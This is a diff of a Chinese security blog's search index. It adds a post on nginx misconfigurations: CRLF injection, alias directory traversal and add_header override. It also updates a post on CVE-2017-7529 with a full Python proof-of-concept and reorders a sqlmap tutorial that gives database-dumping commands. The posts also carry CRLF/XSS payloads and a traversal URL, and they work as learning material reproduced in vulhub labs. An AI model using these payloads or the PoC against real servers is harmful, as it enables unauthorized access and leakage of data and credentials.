@@ -4,11 +4,30 @@
   
     
     <entry>
+      <title>Nginx配置错误导致漏洞</title>
+      <link href="/2019/07/31/nginx-pei-zhi-cuo-wu-dao-zhi-lou-dong/"/>
+      <url>/2019/07/31/nginx-pei-zhi-cuo-wu-dao-zhi-lou-dong/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章主要讲nginx配置错误导致的漏洞，分别是</p><pre><code>1.CRLF注入漏洞2.目录穿越漏洞3.add_header被覆盖</code></pre><h2 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h2><h3 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h3><p>CRLF是“回车+换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来的。所以，一旦我们能够控制HTTP消息头的字符输入，注入一些恶意的换行，我们就能注入一些会话cookie或者HtML代码。它通常和XSS一起联系使用。</p><h3 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码"></a>错误代码</h3><pre><code>server {    listen 8080;    root /usr/share/nginx/html;    index index.html;    server_name _;    location / {        return 302 https://$host$uri;    }}</code></pre><p>一般网站会用<strong>Location:url</strong>的方式来进行302跳转，所以我们可以控制的是Location后面的内容</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>通过传入payload</p><pre><code>/%0d%0aSet-Cookie: This is cookie</code></pre><p><img src="/2019/07/31/nginx-pei-zhi-cuo-wu-dao-zhi-lou-dong/1.PNG" alt=""><br>自定义cookie，可能会造成“会话固定漏洞”，当然，危害不止限于会话固定，还可以通过注入两个CRLF来实现XSS<br>payload</p><pre><code>/%0d%0a%0d%0a&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><p><img src="/2019/07/31/nginx-pei-zhi-cuo-wu-dao-zhi-lou-dong/2.PNG" alt=""><br>发现可以写入从而触发XSS<br>但是浏览器中有filter对xss做防护，当url中有xss相关的特征时就会过滤掉而不显示在页面里，所以不能触发xss。一般用户无法关闭filter，我们可以通过构造X-XSS-Protection: 0去绕过filter的验证。<br>可以参考离别歌的文章</p><pre><code>https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html</code></pre><h2 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h2><p>顾名思义，目录穿越漏洞就是我们访问一个目录可以跳转到另一个目录，nginx默认是不让访问目录的，当前环境是已经允许访问的环境。</p><pre><code>autoindex on;                        #开启目录浏览autoindex_exact_size off;            #显示文件大小（单位K/M/G）autoindex_localtime on;              #显示修改时间charset utf-8,gbk;                   #设置编码</code></pre><h3 id="错误-正确代码"><a href="#错误-正确代码" class="headerlink" title="错误/正确代码"></a>错误/正确代码</h3><pre><code>错误示范：location /files {  alias /home/;</code></pre><pre><code>正确示范：location /files {  alias /home;或location /paper/ {  alias /home/;</code></pre><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>构造payload</p><pre><code>http://192.168.75.131:8081/files../</code></pre><p>可以成功穿越到根目录<br><img src="/2019/07/31/nginx-pei-zhi-cuo-wu-dao-zhi-lou-dong/3.PNG" alt=""></p><h2 id="add-header被覆盖漏洞"><a href="#add-header被覆盖漏洞" class="headerlink" title="add_header被覆盖漏洞"></a>add_header被覆盖漏洞</h2><p>nginx配置文件分为server，location，if等一些配置快，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。而且这种继承也有一些特性，比如add_header，子块中配置完后将会覆盖父块中的配置，造成一些安全隐患。</p><h3 id="错误代码-1"><a href="#错误代码-1" class="headerlink" title="错误代码"></a>错误代码</h3><p>如下的代码中，server头中配置了CSP，但是/test2中又添加了XCTO头，导致父块的配置失效。</p><pre><code>server {    listen 8082;    root /usr/share/nginx/html;    index index.html;    server_name _;    autoindex on;    add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;    add_header X-Frame-Options DENY;    location = /test1 {        rewrite ^(.*)$ /xss.html break;    }    location = /test2 {        add_header X-Content-Type-Options nosniff;        rewrite ^(.*)$ /xss.html break;    }}</code></pre><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p>可能会造成XSS漏洞</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>解决这类问题，最根本的方法就是仔细阅读官方文档，文档里说明了很多配置文件错误和正确的用法，可以加以利用。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>nginx越界读取缓存漏洞CVE-2017-7529</title>
       <link href="/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/"/>
       <url>/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/</url>
       
-        <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。攻击者可以通过发送包含恶意构造range域的header请求，来获取响应中的缓存文件头部信息。在某些配置文件中，缓存文件头可能包含后端服务器的IP地址或其他的敏感信息，从而导致信息泄露。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>nginx 0.5.6-1.13.2</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境是基于vulhub的环境，直接<strong>docker-compose up -d</strong>开启环境<br>根据已公布的poc</p><pre><code>#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2:    print(&quot;%s url&quot; % (sys.argv[0]))    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))    sys.exit()headers = {    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;}offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % (    n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)print(r.text)</code></pre><p>来获取返回的头部信息<br>通过脚本访问的返回<br><img src="/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/1.png" alt=""><br>通过curl的返回<br><img src="/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/2.png" alt=""><br>很明显的看到，通过脚本访问的话，会多返回两条信息，这就是缓存信息，通过我们修改range的值使其溢出，造成缓存信息泄露的漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考大佬文章，膜拜~~</p><pre><code>https://www.freebuf.com/articles/terminal/140402.html</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然是vulhub的环境，但是还是要自己研究一下配置文件，还有源码什么的，更有助于深度的理解。</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。攻击者可以通过发送包含恶意构造range域的header请求，来获取响应中的缓存文件头部信息。在某些配置文件中，缓存文件头可能包含后端服务器的IP地址或其他的敏感信息，从而导致信息泄露。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>nginx 0.5.6-1.13.2</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境是基于vulhub的环境，直接<strong>docker-compose up -d</strong>开启环境<br>根据已公布的poc</p><pre><code>#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2:    print(&quot;%s url&quot; % (sys.argv[0]))    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))    sys.exit()headers = {    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;}offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % (    n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)print(r.text)</code></pre><p>来获取返回的头部信息<br>通过脚本访问的返回<br><img src="/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/1.png" alt=""><br>通过curl的返回<br><img src="/2019/07/31/nginx-yue-jie-du-qu-huan-cun-lou-dong-cve-2017-7529/2.png" alt=""><br>很明显的看到，通过脚本访问的话，会多返回两条信息，这就是缓存信息，通过我们修改range的值使其溢出，造成缓存信息泄露的漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考大佬文章，膜拜~~</p><pre><code>https://www.freebuf.com/articles/terminal/140402.htmlhttps://blog.csdn.net/ski_12/article/details/76944203</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然是vulhub的环境，但是还是要自己研究一下配置文件，还有源码什么的，更有助于深度的理解。</p>]]></content>
       
       
       
@@ -441,25 +460,6 @@
     
     
     <entry>
-      <title>sqlmap使用详解</title>
-      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
-      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
-      
-        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 工具 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>DDCTF writeup</title>
       <link href="/2019/04/22/ddctf-writeup/"/>
       <url>/2019/04/22/ddctf-writeup/</url>
@@ -471,6 +471,25 @@
         <tags>
             
             <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlmap使用详解</title>
+      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
+      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
